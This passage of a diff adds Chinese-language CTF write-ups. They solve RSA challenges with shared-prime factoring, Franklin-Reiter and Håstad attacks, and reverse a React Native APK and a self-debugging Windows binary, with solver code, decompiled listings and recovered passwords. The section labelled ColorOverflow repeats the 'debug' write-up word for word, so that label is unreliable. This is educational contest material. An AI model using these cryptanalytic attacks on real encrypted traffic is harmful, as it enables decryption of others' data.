+enc = open('level3.passwd.enc', 'r').read()
+enc = int(enc.encode('hex'), 16)
+
+assert(enc < n)
+text = pow(enc, d, n)
+print ("%01024x" % text).decode('hex')
+
+
+# below is output:
+j�������Ibq�[��.��i}#
+s����'w+���
+           t�����5�dC�6���]���F���;��,��e��l�9L�q��ۉ�$$x��BwIe6ER1s_1TtA3k_e_t00_larg3
+
+```
+
+输出前面是乱码，但最后的字符貌似是对的，看了前面两个密码的格式，貌似是解密方法的名字，那这里的密码应该是`wIe6ER1s_1TtA3k_e_t00_larg3`，解压成功，拿到flag。
+
+
+### 总结
+虽然三个关卡都过，但还是有些疑问未能解疑：
++ `RSATool`和`yafu`分解因子的算法具体有那些不同，什么样的场景更适合用那个工具?
++ 为何`level0`自己用pow解密不成功？
++ `level2`解密后前面的乱码是真的乱码还是解密的方式还是有些不对？
+
+
+
+### File: ctf-writeups/2016/SCTF/code/code150/README.md
+
+## Code150 (crypto, 150p)
+
+经过L3m0n和大家的努力，现在已经进入到了SYC Security System的入口，L3m0n凭借着高超的渗透技术截获了SYC Security System Server端和Client端的交互流量数据，你能解开谜团进入到系统深处吗？
+
+ 
+[RSA_02.zip](./RSA_02.zip)
+
+---------------------------------------
+
+
+### level4
+解压文件后发现一个`level5`的压缩包（需要密码打开，里面是flag文件），还有一个pcap文件。用`wireshare`分析pcap文件，发现是SYC Security System Server端和Client端的交互流量数据，有10个报文。格式如下：
+
+```
+__        __   _                            _          ______   ______
+\ \      / /__| | ___ ___  _ __ ___   ___  | |_ ___   / ___\ \ / / ___|
+ \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \  \___ \\ V / |
+  \ V  V /  __/ | (_| (_) | | | | | |  __/ | || (_) |  ___) || || |___
+   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  |____/ |_| \____|
+
+ ____                       _ _           ____            _
+/ ___|  ___  ___ _   _ _ __(_) |_ _   _  / ___| _   _ ___| |_ ___ _ __ ___
+\___ \ / _ \/ __| | | | '__| | __| | | | \___ \| | | / __| __/ _ \ '_ ` _ \
+ ___) |  __/ (__| |_| | |  | | |_| |_| |  ___) | |_| \__ \ ||  __/ | | | | |
+|____/ \___|\___|\__,_|_|  |_|\__|\__, | |____/ \__, |___/\__\___|_| |_| |_|
+                                  |___/         |___/
+Please send your public key, then We will use your public key to encrypt int(level5.passwd.encode('hex'), 16), finally, we send the ciphertext to you.
+20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031
+ 65537
+We have got N is 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031
+e is 65537
+encrypted messages is 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7
+```
+
+大概就是encrypted messages为`pow(int(level5.passwd.encode('hex'), 16), e, N)`。   
+
+首先，把所有`N`,`e`,`encrypted messages`都提取出来，由于不知道`pcap`的格式，所以没有程序提取，都是手工提取的。之后判断下所有`N`是否互质。
+
+``` python
+# check coprime
+item = [N0, N1, N2, N3, N4, N5, N6, N7, N8, N9]
+for i in range(len(item)):
+    for j in range(len(item)):
+        if i == j: continue 
+        if item[i] == item[j]:
+            print "equal %d - %d" % (i, j)
+            continue
+        if gmpy.gcd(item[i], item[j]) != 1:
+            print "%d - %d" % (i, j)
+```            
+
+结果发现都不互质，那么gcd的值其实就是`p`或`q`,随便选取了两个`N`,就可以解出来，如下：
+
+``` python
+def decode(NA, CA, NB):
+    p = gmpy.gcd(NA, NB)
+    q = NA / p 
+    assert(p*q == NA)
+    # print p 
+    # print q 
+    phi = (p-1)*(q-1)
+    d = gmpy.invert(e, phi)
+    m = pow(CA, d, NA)
+    assert(pow(m, e, NA) == CA)
+    print ("%01024x" % m).decode('hex')
+
+decode(N0, C0, N1)
+
+# below is output:
+# sH1R3_PRlME_1N_rsA_iS_4ulnEra5le
+
+```
+
+用`sH1R3_PRlME_1N_rsA_iS_4ulnEra5le`解压后即得到flag。详细代码请看[ans.py](./ans.py)
+
+
+
+
+### File: ctf-writeups/2016/SCTF/code/code300/README.md
+
+## Code300 (crypto, 300p)
+
+
+
+ 
+[RSA_03.zip](./RSA_03.zip)
+
+---------------------------------------
+
+
+### level3
+解压文件后发现一个`level4`的压缩包（需要密码打开，里面是下一层的题目），还有一个pcap文件。用`wireshare`分析pcap文件，有11个报文。格式如下：
+
+```
+              .-"""-.
+             / .===. \
+             \/ 6 6 \/
+             ( \___/ )
+  _______ooo__\_____/___________
+ /                              \
+| Welcome to SYC Security System |
+ \____________________ooo_______/
+             |  |  |
+             |_ | _|
+             |  |  |
+             |__|__|
+             /-'Y'-\
+            (__/ \__)
+Please send your public key and your user_id, then We will add your user_id to the int(level4.passwd.encode('hex'), 16), finally, we put all the message above encryption to send to you.
+25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553 3 1002
+
+We have got N is 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553
+e is 3
+user_id is 1002
+
+encrypted messages is 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718L
+
+```
+
+大概就是encrypted messages为`pow(int(level4.passwd.encode('hex') + user_id, 16), e, N)`。   
+
+首先，把所有`N`,`e`,`encrypted messages`都提取出来。之后判断下所有`N`是否互质。
+
+``` python
+# check coprime
+item = [N0, N1, N2, N3, N4, N5, N6, N7, N8, N9, N10]
+for i in range(len(item)):
+    for j in range(len(item)):
+        if i == j: continue 
+        if item[i] == item[j]:
+            print "equal %d - %d" % (i, j)
+            continue
+        if gmpy.gcd(item[i], item[j]) != 1:
+            print "%d - %d" % (i, j)
+```            
+
+结果发现都互质，但`N0`和`N9`是一样的。于是google下，发现了[Franklin-Reiter related-message attack](https://en.wikipedia.org/wiki/Coppersmith's_attack#Franklin-Reiter_related-message_attack)，又找了些资料看，最后Sage代码如下：[PS:可以在线执行](https://sagecell.sagemath.org/)
+
+``` python
+
+c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08
+c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718
+
+n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553
+
+id1 = 2614
+id2 = 1002
+r = id1 - id2
+
+R.<X> = Zmod(n)[]
+f1 = X^3 - c2
+f2 = (X + r)^3 - c1
+
+def my_gcd(a, b): 
+    return a.monic() if b == 0 else my_gcd(b, a % b)
+
+m = - my_gcd(f1, f2).coefficients()[0] # coefficient 0 = -m
+print m
+print ("%01024x" % (m-id2)).decode('hex')
+
+# below is output:
+# 2766183304860995133933011694934796975764977986118568878738477226095101006199323420614968945428600639141020780267130934
+# F4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL
+
+```
+
+### level4
+用`F4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL`解压后进入level4(又是level4!!!)。还是一样，给了个`level6`的压缩包（需要密码打开，里面是flag文件），还有一个pcap文件。用`wireshare`分析pcap文件，有挺多报文的，格式如下：
+
+```
+          .--,       .--,
+         ( (  \.---./  ) )
+          '.__/o   o\__.'
+             {=  ^  =}
+              >  -  <
+ _________.""`-------`"".________
+/                                \
+\ Welcome to SYC Security System /
+/                                \
+\________________________________/
+           ___)( )(___
+          (((__) (__)))
+
+Please send your public key, then We will use your public key to encrypt int(level6.passwd.encode('hex'), 16), finally, we send the ciphertext to you.
+21778816622407043254249033744556437773178718344170907687035355752306254181495272254316323076827432323583279284697609943296234700945010885010381052459024155936090811012664924674758219163065019349740707282354505096608107707774970709715259835448587834080152409078047162951805940071358655938727249679105305351838950073539149057650448964397736279148746703675407495243942505041731104580156762842345374978325029947055323567120523592936170640156611551704828034384851988154353272897487218723570180022092379408219114849763765186588476489924721044926152006318666687949095907516827647042434514271847608156543261745856327152256691
+ 19
+We have got N is 21778816622407043254249033744556437773178718344170907687035355752306254181495272254316323076827432323583279284697609943296234700945010885010381052459024155936090811012664924674758219163065019349740707282354505096608107707774970709715259835448587834080152409078047162951805940071358655938727249679105305351838950073539149057650448964397736279148746703675407495243942505041731104580156762842345374978325029947055323567120523592936170640156611551704828034384851988154353272897487218723570180022092379408219114849763765186588476489924721044926152006318666687949095907516827647042434514271847608156543261745856327152256691
+
+e is 19
+encrypted messages is 0x36a66571751faf3bbf6ad760adbcd1be123d2ab526d2fbf6697ec38c7d4ee7d709d8ab3f154092410f46ae18ac75aa32ec9393a98385cd8d8df3b5a15eeccb2637b353f6808fd39e11faf2b742eb0597f8e7a977196171b031c076140cb05c771d8df2f81d8b904e8bf579da0e568fa67d0a94a7607a002c456824e7ea71df895f1967b12ac36eade287589fd556c71520d2dfdb1a8663dcae615cc40be1ff82ae42ae617db75bb1dd88235fd698b53921a42fa6390854eb1393d24341582ce83bd690ea12d2697bc929a77b51adb04131baee52050340be9a2be6eaf795b6877bcc22d5d8cce3829485340b641585ba3ad169850e780562467fbfb09f4f5235
+
+```
+
+encrypted messages为`pow(int(level6.passwd.encode('hex'), 16), e, N)`, 和code150中level4是一样的。同样的，把`N`,`e`,`encrypted messages`提取出来，这次报文有点多，只提取了前面13个(好累啊)，先测试下N是否互质。发现都互质，那么应该是[Håstad's broadcast attack](https://en.wikipedia.org/wiki/Coppersmith's_attack#H.C3.A5stad.27s_broadcast_attack)。测试了下，发现确实是，代码如下：
+
+``` python
+from attackrsa import *
+t = Hastad.Hastad([N0, N1, N2, N3], e, 
+                  [C0, C1, C2, C3])
+pt = t.decrypt()
+# print pt
+print ("%01024x" % pt).decode('hex')
+
+# below is output:
+# H1sTaDs_B40aDcadt_attaCk_e_are_same_and_smA9l
+```
+
+用`H1sTaDs_B40aDcadt_attaCk_e_are_same_and_smA9l`解压后即得到flag。详细代码请看[ans.py](./ans.py)
+
+
+
+
+### File: ctf-writeups/2016/alictf/ColorOverflow/README.md
+
+## debug (reverse, 200p)
+
+[debug.zip](./debug.zip)
+
+---------------------------------------
+
+### 思路
+这题使用了调试器的一些知识，启动程序后，创建一个新的进程，原来进程为调试器，新进程为被调试进程。使用`CreateMutexA`来区分调试器和被调试进程的逻辑。用IDA F5分析，调试器逻辑如下：
+```
+DWORD sub_4014D0()
+{
+  HMODULE v0; // eax@1
+  DWORD v1; // eax@2
+  DWORD result; // eax@2
+  unsigned int v3; // eax@7
+  signed int v4; // eax@11
+  DWORD v5; // eax@16
+  struct _PROCESS_INFORMATION ProcessInformation; // [sp+10h] [bp-4A4h]@1
+  unsigned __int8 Buffer; // [sp+20h] [bp-494h]@1
+  unsigned __int8 v8; // [sp+21h] [bp-493h]@1
+  __int16 v9; // [sp+3Dh] [bp-477h]@1
+  char v10; // [sp+3Fh] [bp-475h]@1
+  struct _DEBUG_EVENT DebugEvent; // [sp+40h] [bp-474h]@1
+  struct _STARTUPINFOA StartupInfo; // [sp+A0h] [bp-414h]@1
+  CHAR Filename; // [sp+E4h] [bp-3D0h]@1
+  char v14; // [sp+E5h] [bp-3CFh]@1
+  __int16 v15; // [sp+1E5h] [bp-2CFh]@1
+  char v16; // [sp+1E7h] [bp-2CDh]@1
+  CONTEXT Context; // [sp+1E8h] [bp-2CCh]@1
+
+  Filename = 0;
+  memset(&v14, 0, 0x100u);
+  v15 = 0;
+  v16 = 0;
+  StartupInfo.cb = 68;
+  memset(&StartupInfo.lpReserved, 0, 0x40u);
+  ProcessInformation.hThread = 0;
+  ProcessInformation.dwProcessId = 0;
+  DebugEvent.dwDebugEventCode = 0;
+  memset(&DebugEvent.dwProcessId, 0, 0x5Cu);
+  Context.ContextFlags = 0;
+  ProcessInformation.dwThreadId = 0;
+  memset(&Context.Dr0, 0, 0x2C8u);
+  Buffer = 0;
+  memset(&v8, 0, 0x1Cu);
+  v9 = 0;
+  ProcessInformation.hProcess = 0;
+  v10 = 0;
+  v0 = GetModuleHandleA(0);
+  GetModuleFileNameA(v0, &Filename, 0x104u);
+  if ( CreateProcessA(0, &Filename, 0, 0, 0, 3u, 0, 0, &StartupInfo, &ProcessInformation) )
+  {
+    while ( 1 )
+    {
+      memset(&DebugEvent, 0, sizeof(DebugEvent));
+      if ( !WaitForDebugEvent(&DebugEvent, 0xFFFFFFFF) )
+        break;
+      result = DebugEvent.dwDebugEventCode;
+      if ( DebugEvent.dwDebugEventCode == 1 )
+      {
+        if ( DebugEvent.u.Exception.ExceptionRecord.ExceptionCode == STATUS_ILLEGAL_INSTRUCTION )
+        {
+          if ( DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress == &loc_4014A6 )
+          {
+            ReadProcessMemory(ProcessInformation.hProcess, &loc_4014A8, &Buffer, 4u, 0);
+            v3 = 0;
+            do
+              *(&Buffer + v3++) ^= 0x7Fu;
+            while ( v3 < 4 );
+            WriteProcessMemory(ProcessInformation.hProcess, &loc_4014A8, &Buffer, 4u, 0);
+            Context.ContextFlags = 65543;
+            GetThreadContext(ProcessInformation.hThread, &Context);
+            Context.Eip += 2;                   // 跳过无效指令
+            SetThreadContext(ProcessInformation.hThread, &Context);
+          }
+          else if ( DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress == &loc_4014B9 )
+          {
+            v4 = 0;
+            do
+              *((_BYTE *)&dword_407040 + v4++) ^= 0x31u;
+            while ( v4 < 16 );
+            WriteProcessMemory(ProcessInformation.hProcess, &dword_407040, &dword_407040, 0x10u, 0);
+            Buffer = 0xE8u;
+            v8 = 0xB2u;                        // v8 = Buffer+1
+            WriteProcessMemory(ProcessInformation.hProcess, &loc_4014B9, &Buffer, 2u, 0);
+          }
+        }
+      }
+      else if ( DebugEvent.dwDebugEventCode == 5 )
+      {
+        return result;
+      }
+      ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, 0x10002u);
+    }
+    v5 = GetLastError();
+    result = printf(aWaitfordebugev, v5);
+  }
+  else
+  {
+    v1 = GetLastError();
+    result = printf(aCreateprocessF, v1);
+  }
+  return result;
+}
+```
+
+可以看到主要是被调试程序异常报错后把信息返回给调试器，调试器Patch其内存并使之继续执行。有三处地方需要patch，我们才可以看到真正的被调试进程的代码。使用以下idapython脚本进行patch：
+
+```python
+from idaapi import *
+
+def patch(addr, size, magic):
+    for i in range(size):
+        ch = Byte(addr + i)
+        ch = ch ^ magic
+        PatchByte(addr + i, ch)
+
+patch(0x004014A8, 4, 0x7f)
+patch(0x00407040, 16, 0x31)
+
+addr = 0x004014B9
+PatchByte(addr, 0xe8)
+PatchByte(addr+1, 0xb2)
+```
+
+之后找到flag的主逻辑如下：
+```
+int sub_401370()
+{
+  signed int v0; // eax@1
+  signed int v1; // esi@3
+  signed int index; // ecx@7
+  char v3; // al@8
+  char v5[4]; // [sp+0h] [bp-10h]@1
+  int v6; // [sp+4h] [bp-Ch]@1
+  int v7; // [sp+8h] [bp-8h]@1
+  int v8; // [sp+Ch] [bp-4h]@1
+
+  strcpy(v5, "\x14R1");                         // 0x315214
+  v6 = dword_40705C;
+  v8 = dword_407064;
+  v7 = dword_407060;
+  v0 = 0;
+  do
+  {
+    v5[v0] ^= 0x31u;                            // %c
+    ++v0;
+  }
+  while ( v0 < 3 );
+  v1 = 0;
+  do
+    printf(v5, *((_BYTE *)&v6 + v1++) ^ 0x31);  // Input Flag:
+  while ( v1 < 11 );
+  gets(flag);
+  if ( strlen(flag) != 32 )                     // length is 32
+    exit(0);
+  index = 0;
+  do
+  {
+    v3 = flag[index];
+    if ( v3 < '0' || v3 > 'z' || v3 > '9' && v3 < 'a' )// [a-z0-9]+
+      exit(0);
+    ++index;
+  }
+  while ( index < 32 );
+  sub_401290();                                 // 高低位换
+  sub_4010C0();
+  sub_401100();                                 // 高低位换
+  encode_TEA(&tmp0, &AAA0);                     // TEA加密
+  encode_TEA(&tmp2, &AAA0);
+  sub_4011E0();
+  return my_good();                             // 比较验证，输出结果
+}
+```
+
+首先是解密提示语句（Input Flag:），之后判断输入的flag长度（必须为32），再判断是否为有效字符（[a-z0-9]）。
+接下来是做一些变换，然后进行128轮的TEA加密，判断是目标值是否相同，如果一致即可。解密脚本请看[ans.py](./ans.py), 详细分析过程请看IDA的分析文件[debug.idb](./debug.idb)。
+
+### 总结
+1. 用搜索引擎对`0x61C88647`进行搜索，可以快速知道这是TEA加密算法
+2. 用python写TEA解密算法时，发现一个问题，用`c_uint`可以得到正确结果，用`c_int`不能。现在猜测是最后结果在转换为正整数的时候（c_int & 0xffffffff）有点问题。
+
+
+
+
+
+### File: ctf-writeups/2016/alictf/REact/README.md
+
+## REact (reverse, 250p)
+
+[REact.apk](./REact.apk)
+
+---------------------------------------
+
+### 思路
+这是一个用REact Native框架写的apk，REact Native是facebook开发的框架，基于这个框架可以使用javascript来编写应用逻辑。本来以为很难，但最后看到很有多队伍做出来了，也就看了下。用apktool解包后，在assets文件夹下有个用javascript写的代码，在里面搜索'alictf'，真的有。在网上格式化js[simplify.js](./simplify.js)后，看了下附近的逻辑，如下：
+
+``` javascript
+        {
+            key: "handleSubmit",
+            value: function(e) {
+                var t = this,
+                n = t.state.text;
+                if (40 != n.length) o.NativeModules.MyBridge.show("Wrong, try again", 3.5);
+                else {
+                    var r = n.slice(7, 23),
+                    i = n.slice(23, 39),
+                    a = n.slice(0, 7);
+                    "alictf{" != a || "}" != n.slice(39, 40) ? o.NativeModules.MyBridge.show("Wrong, try again", 3.5) : o.NativeModules.MyBridge.check1(r,
+                    function() {
+                        o.NativeModules.MyBridge.show("Wrong, try again", 3.5)
+                    },
+                    function() {
+                        s(i,
+                        function() {
+                            t.setState({
+                                text: "Congratulations! Reversing callbacks is fun"
+                            })
+                        },
+                        function() {
+                            o.NativeModules.MyBridge.show("Wrong, try again", 3.5)
+                        })
+                    })
+                }
+            }
+```
+
+逻辑很清晰，flag长度为40，格式为`alictf{`+16个字符的`r`+16个字符的`i`+`}`,`r`是用`Mybridge.check1`来验证的，很`jeb`反汇编下apk，很清楚看到check1的逻辑，用python反写下，就得到`r`的值，如下：
+
+``` python
+a = [ord(ch) for ch in 'excited']
+b = [0x0e, 0x1d, 0x06, 0x19, ord('+'), 0x1c, 0x0b,
+     0x10, 0x16, 0x04, ord('6'), 0x15, 0x0b, 0,
+     ord(':'), 0x0b]
+
+res = []
+for i in range(16):
+  ch = b[i] ^ a[i%len(a)]
+  res.append(chr(ch))
+print "".join(res)
+
+# below is output:
+# keep_young_and_s
+```
+
+接下来是对`i`的验证，我们看是用是`s`来验证的，往上找下，确实有个`s`，采用闭包，还有尾递归，但十分复杂。加上很多变量名是都是一样的，不好分析其逻辑。一开始问了下队友，是否可以简化这段代码（因为我不擅长javascript），但他们试了下，发现还是不行。最后还是只能慢慢看，发现关键验证在这里：
+```
+function t(e, t, r) {
+    var a = e[c](l)[u](function(e) {
+        return e[o][p](o)
+    });  // python写法是 a = [ord(ch) for ch in e]
+    ae(s, a,
+    function(e) {
+        console[d](e);     // d的值是闭包里的，为'log',所以这里是console.log(e);
+        for (var s = o; s < e[n]; s++) if (e[s] != i[s]) {  //关键判断语句
+            r();     // 错误时的回调函数
+            break
+        }
+        s == e[n] && t()   // 正确时的回调函数
+    })
+}
+```
+
+看到这里，我们会去看`ae`的定义，然后跟踪下，但这里涉及太多递归，很容易看晕，所以决定采用动态调试。一开始我是firefox浏览器来调试的，下断点，看到一些关键变量的值。但发现貌似递归太多了，F8继续运行貌似有点问题，没有断点也断下来。后来采用打log方式，在几个关键位置写上`console.log`打印相关信息[test.html](./test.html)，运行后，查看log[test.log](./test.log),推理其加密方式，发现这其实是个矩阵乘法，这里还有个坑，结果是倒序存放的。用z3库很快就解出来矩阵了，详细代码请看[ans.py](./ans.py)
+
+### 总结
+虽然这题是熬夜做的，但还是挺值得的，当时好兴奋，换了几种方式，最后采用打log的方式成功推理出加密逻辑，解决问题的感觉真好！赛后和队友讨论下，这种js代码应该是AST工具变换生成出来的，不知道是否有逆向工具？现在也想知道别人是怎么做的，是否有更加快捷方便的方式。
+
+
+
+### File: ctf-writeups/2016/alictf/debug/README.md
+
+## debug (reverse, 200p)
+
+[debug.zip](./debug.zip)
+
+---------------------------------------
+
+### 思路
+这题使用了调试器的一些知识，启动程序后，创建一个新的进程，原来进程为调试器，新进程为被调试进程。使用`CreateMutexA`来区分调试器和被调试进程的逻辑。用IDA F5分析，调试器逻辑如下：
+```
+DWORD sub_4014D0()
+{
+  HMODULE v0; // eax@1
+  DWORD v1; // eax@2
+  DWORD result; // eax@2
+  unsigned int v3; // eax@7
+  signed int v4; // eax@11
+  DWORD v5; // eax@16
+  struct _PROCESS_INFORMATION ProcessInformation; // [sp+10h] [bp-4A4h]@1
+  unsigned __int8 Buffer; // [sp+20h] [bp-494h]@1
+  unsigned __int8 v8; // [sp+21h] [bp-493h]@1
+  __int16 v9; // [sp+3Dh] [bp-477h]@1
+  char v10; // [sp+3Fh] [bp-475h]@1
+  struct _DEBUG_EVENT DebugEvent; // [sp+40h] [bp-474h]@1
+  struct _STARTUPINFOA StartupInfo; // [sp+A0h] [bp-414h]@1
+  CHAR Filename; // [sp+E4h] [bp-3D0h]@1
+  char v14; // [sp+E5h] [bp-3CFh]@1
+  __int16 v15; // [sp+1E5h] [bp-2CFh]@1
+  char v16; // [sp+1E7h] [bp-2CDh]@1
+  CONTEXT Context; // [sp+1E8h] [bp-2CCh]@1
+
+  Filename = 0;
+  memset(&v14, 0, 0x100u);
+  v15 = 0;
+  v16 = 0;
+  StartupInfo.cb = 68;
+  memset(&StartupInfo.lpReserved, 0, 0x40u);
+  ProcessInformation.hThread = 0;
+  ProcessInformation.dwProcessId = 0;
+  DebugEvent.dwDebugEventCode = 0;
+  memset(&DebugEvent.dwProcessId, 0, 0x5Cu);
+  Context.ContextFlags = 0;
+  ProcessInformation.dwThreadId = 0;
+  memset(&Context.Dr0, 0, 0x2C8u);
+  Buffer = 0;
+  memset(&v8, 0, 0x1Cu);
+  v9 = 0;
+  ProcessInformation.hProcess = 0;
+  v10 = 0;
+  v0 = GetModuleHandleA(0);
+  GetModuleFileNameA(v0, &Filename, 0x104u);
+  if ( CreateProcessA(0, &Filename, 0, 0, 0, 3u, 0, 0, &StartupInfo, &ProcessInformation) )
+  {
+    while ( 1 )
+    {
+      memset(&DebugEvent, 0, sizeof(DebugEvent));
+      if ( !WaitForDebugEvent(&DebugEvent, 0xFFFFFFFF) )
+        break;
+      result = DebugEvent.dwDebugEventCode;
+      if ( DebugEvent.dwDebugEventCode == 1 )
+      {
+        if ( DebugEvent.u.Exception.ExceptionRecord.ExceptionCode == STATUS_ILLEGAL_INSTRUCTION )
+        {
+          if ( DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress == &loc_4014A6 )
+          {
+            ReadProcessMemory(ProcessInformation.hProcess, &loc_4014A8, &Buffer, 4u, 0);
+            v3 = 0;
+            do
+              *(&Buffer + v3++) ^= 0x7Fu;
+            while ( v3 < 4 );
+            WriteProcessMemory(ProcessInformation.hProcess, &loc_4014A8, &Buffer, 4u, 0);
+            Context.ContextFlags = 65543;
+            GetThreadContext(ProcessInformation.hThread, &Context);
+            Context.Eip += 2;                   // 跳过无效指令
+            SetThreadContext(ProcessInformation.hThread, &Context);
+          }
+          else if ( DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress == &loc_4014B9 )
+          {
+            v4 = 0;
+            do
+              *((_BYTE *)&dword_407040 + v4++) ^= 0x31u;
+            while ( v4 < 16 );
+            WriteProcessMemory(ProcessInformation.hProcess, &dword_407040, &dword_407040, 0x10u, 0);
+            Buffer = 0xE8u;
+            v8 = 0xB2u;                        // v8 = Buffer+1
+            WriteProcessMemory(ProcessInformation.hProcess, &loc_4014B9, &Buffer, 2u, 0);
+          }
+        }
+      }
+      else if ( DebugEvent.dwDebugEventCode == 5 )
+      {
+        return result;
+      }
+      ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, 0x10002u);
+    }
+    v5 = GetLastError();
+    result = printf(aWaitfordebugev, v5);
+  }
+  else
+  {
+    v1 = GetLastError();
+    result = printf(aCreateprocessF, v1);
+  }
+  return result;
+}
+```
+
+可以看到主要是被调试程序异常报错后把信息返回给调试器，调试器Patch其内存并使之继续执行。有三处地方需要patch，我们才可以看到真正的被调试进程的代码。使用以下idapython脚本进行patch：
+
+```python
+from idaapi import *
+
+def patch(addr, size, magic):
+    for i in range(size):
+        ch = Byte(addr + i)
+        ch = ch ^ magic
+        PatchByte(addr + i, ch)
+
+patch(0x004014A8, 4, 0x7f)
+patch(0x00407040, 16, 0x31)
+
+addr = 0x004014B9
+PatchByte(addr, 0xe8)
+PatchByte(addr+1, 0xb2)
+```
+
+之后找到flag的主逻辑如下：
+```
+int sub_401370()
+{
+  signed int v0; // eax@1
+  signed int v1; // esi@3
+  signed int index; // ecx@7
+  char v3; // al@8
+  char v5[4]; // [sp+0h] [bp-10h]@1
+  int v6; // [sp+4h] [bp-Ch]@1
+  int v7; // [sp+8h] [bp-8h]@1
+  int v8; // [sp+Ch] [bp-4h]@1
+
+  strcpy(v5, "\x14R1");                         // 0x315214
+  v6 = dword_40705C;
+  v8 = dword_407064;
+  v7 = dword_407060;
+  v0 = 0;
+  do
+  {
+    v5[v0] ^= 0x31u;                            // %c
+    ++v0;
+  }
+  while ( v0 < 3 );
+  v1 = 0;
+  do
+    printf(v5, *((_BYTE *)&v6 + v1++) ^ 0x31);  // Input Flag:
+  while ( v1 < 11 );
+  gets(flag);
+  if ( strlen(flag) != 32 )                     // length is 32
+    exit(0);
+  index = 0;
+  do
+  {
+    v3 = flag[index];
+    if ( v3 < '0' || v3 > 'z' || v3 > '9' && v3 < 'a' )// [a-z0-9]+
+      exit(0);
+    ++index;
+  }
+  while ( index < 32 );
+  sub_401290();                                 // 高低位换
+  sub_4010C0();
+  sub_401100();                                 // 高低位换
+  encode_TEA(&tmp0, &AAA0);                     // TEA加密
+  encode_TEA(&tmp2, &AAA0);
+  sub_4011E0();
+  return my_good();                             // 比较验证，输出结果
+}
+```
+
+首先是解密提示语句（Input Flag:），之后判断输入的flag长度（必须为32），再判断是否为有效字符（[a-z0-9]）。
+接下来是做一些变换，然后进行128轮的TEA加密，判断是目标值是否相同，如果一致即可。解密脚本请看[ans.py](./ans.py), 详细分析过程请看IDA的分析文件[debug.idb](./debug.idb)。
+
+### 总结
+1. 用搜索引擎对`0x61C88647`进行搜索，可以快速知道这是TEA加密算法
+2. 用python写TEA解密算法时，发现一个问题，用`c_uint`可以得到正确结果，用`c_int`不能。现在猜测是最后结果在转换为正整数的时候（c_int & 0xffffffff）有点问题。
+
+
+
+
+
